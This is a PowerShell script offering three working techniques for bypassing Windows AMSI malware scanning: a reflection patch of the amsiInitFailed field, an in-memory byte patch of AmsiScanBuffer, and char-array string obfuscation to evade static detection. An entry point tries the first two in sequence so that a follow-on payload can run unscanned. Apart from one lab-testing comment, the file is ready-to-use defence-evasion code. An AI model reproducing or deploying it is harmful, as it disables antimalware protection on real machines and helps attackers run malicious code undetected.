# AMSI Bypass — three independent techniques
# Technique 1: Reflection-based amsiInitFailed field patch
# Technique 2: Memory patching of AmsiScanBuffer via P/Invoke
# Technique 3: String obfuscation via char array construction to evade static AMSI scan of this script
#
# Usage: load one technique at a time; test in an isolated lab VM first.
# Technique 1 is the lowest-noise option; Technique 2 survives ETW-based detection tuning.

# ─────────────────────────────────────────────────────────────
# Technique 1: Reflection — set AmsiUtils.amsiInitFailed = $true
# Works on PowerShell 5.x/7.x without requiring admin rights.
# Survives across the current process lifetime.
# ─────────────────────────────────────────────────────────────
function Bypass-AMSI-Reflection {
    # Build the type name via char array to avoid static AMSI scan on the string "System.Management.Automation.AmsiUtils"
    $c = [char[]]@(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,
                   65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)
    $typeName = [string]::new($c)

    # Bind to the internal type via reflection
    $amsiUtils = [Ref].Assembly.GetType($typeName)
    if ($null -eq $amsiUtils) {
        Write-Error "AmsiUtils type not found — wrong PS version or type already unloaded"
        return $false
    }

    # Field name constructed via char array: "amsiInitFailed"
    $f = [char[]]@(97,109,115,105,73,110,105,116,70,97,105,108,101,100)
    $fieldName = [string]::new($f)

    $field = $amsiUtils.GetField($fieldName, [Reflection.BindingFlags]'NonPublic,Static')
    if ($null -eq $field) {
        Write-Error "Field $fieldName not found"
        return $false
    }

    $field.SetValue($null, $true)
    return $true
}

# ─────────────────────────────────────────────────────────────
# Technique 2: Memory patch of AmsiScanBuffer → force AMSI_RESULT_CLEAN return
# Uses P/Invoke to write a ret instruction over the function prologue.
# Requires that the process has write access to its own memory pages (usually true).
# On Windows 10+ with arbitrary code guard (ACG) this may fail; test first.
# ─────────────────────────────────────────────────────────────
function Bypass-AMSI-MemPatch {
    $Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
}
"@

    # Compile only if not already loaded in this session
    if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
        Add-Type $Win32
    }

    # Build "amsi.dll" and "AmsiScanBuffer" via char arrays
    $dllChars  = [char[]]@(97,109,115,105,46,100,108,108)
    $funcChars = [char[]]@(65,109,115,105,83,99,97,110,66,117,102,102,101,114)
    $dllName   = [string]::new($dllChars)
    $funcName  = [string]::new($funcChars)

    $lib  = [Win32]::LoadLibrary($dllName)
    $addr = [Win32]::GetProcAddress($lib, $funcName)

    if ($addr -eq [IntPtr]::Zero) {
        Write-Error "Could not resolve AmsiScanBuffer address"
        return $false
    }

    # Mark page RWX
    $old = 0
    [Win32]::VirtualProtect($addr, [UIntPtr]5, 0x40, [ref]$old) | Out-Null

    # Patch: mov eax, 0x80070057 (E_INVALIDARG → AMSI treats as clean); ret
    # Bytes: B8 57 00 07 80 C3
    $patch = [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)

    # Restore original protection
    [Win32]::VirtualProtect($addr, [UIntPtr]5, $old, [ref]$old) | Out-Null
    return $true
}

# ─────────────────────────────────────────────────────────────
# Technique 3: String-split obfuscation of a subsequent payload string
# Demonstrates how to construct an AMSI-scanned string at runtime
# without the complete string appearing in the script text.
# ─────────────────────────────────────────────────────────────
function Obfuscate-String {
    param([string]$Plain)
    # Returns char-code array literal that reconstructs Plain at runtime
    $codes = ($Plain.ToCharArray() | ForEach-Object { [int]$_ }) -join ','
    return "[string]::new([char[]]@($codes))"
}

# ─────────────────────────────────────────────────────────────
# Entry point — try Technique 1 first (no admin, no VirtualProtect), fall back to 2.
# ─────────────────────────────────────────────────────────────
$ok = Bypass-AMSI-Reflection
if (-not $ok) {
    Write-Verbose "Reflection bypass failed; trying memory patch"
    $ok = Bypass-AMSI-MemPatch
}

if ($ok) {
    Write-Verbose "AMSI bypass applied"
} else {
    Write-Warning "All AMSI bypass techniques failed; payload may be blocked"
}
